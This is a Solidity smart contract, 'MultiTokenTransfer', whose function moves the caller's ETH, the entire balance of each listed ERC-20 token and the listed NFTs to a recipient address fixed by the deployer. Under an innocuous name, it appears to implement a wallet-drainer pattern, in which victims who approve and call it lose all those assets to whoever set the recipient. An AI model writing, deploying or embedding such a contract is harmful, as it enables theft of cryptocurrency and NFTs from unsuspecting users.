// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract MultiTokenTransfer {
    address public recipient;

    constructor(address _recipient) {
        recipient = _recipient;
    }

    function transferAll(
        address[] calldata tokenContracts,  // ERC-20 tokens
        address[] calldata nftContracts,   // NFT contracts
        uint256[][] calldata tokenIds      // Nested array for multiple IDs per NFT contract
    ) external payable {
        require(nftContracts.length == tokenIds.length, "Mismatched NFT and Token IDs array");

        // Transfer ETH to the recipient
        payable(recipient).transfer(msg.value);

        // Transfer ERC-20 tokens
        for (uint256 i = 0; i < tokenContracts.length; i++) {
            IERC20 token = IERC20(tokenContracts[i]);
            uint256 balance = token.balanceOf(msg.sender);
            if (balance > 0) {
                token.transferFrom(msg.sender, recipient, balance);
            }
        }

        // Transfer NFTs
        for (uint256 i = 0; i < nftContracts.length; i++) {
            IERC721 nft = IERC721(nftContracts[i]);
            uint256[] memory ids = tokenIds[i];
            for (uint256 j = 0; j < ids.length; j++) {
                nft.transferFrom(msg.sender, recipient, ids[j]);
            }
        }
    }
}
